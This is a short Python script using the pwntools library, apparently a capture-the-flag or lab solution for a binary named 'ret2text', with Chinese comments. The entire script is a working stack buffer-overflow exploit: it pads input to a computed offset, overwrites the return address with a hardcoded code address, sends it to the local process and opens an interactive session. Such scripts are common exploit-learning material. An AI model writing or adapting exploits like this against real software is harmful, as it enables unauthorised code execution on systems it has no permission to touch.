


from pwn import *

def main():

    sh = process('./ret2text')

    target = 0x0804863A

    offset = 0xffffd058 - 0xffffcfec + 4
    
    ## 构造payload
    payload = 'A' * offset + p32(target).decode('unicode_escape')

    ## 向程序发送字符串
    sh.sendline(payload)


    sh.interactive()

if __name__ == "__main__":
    main()

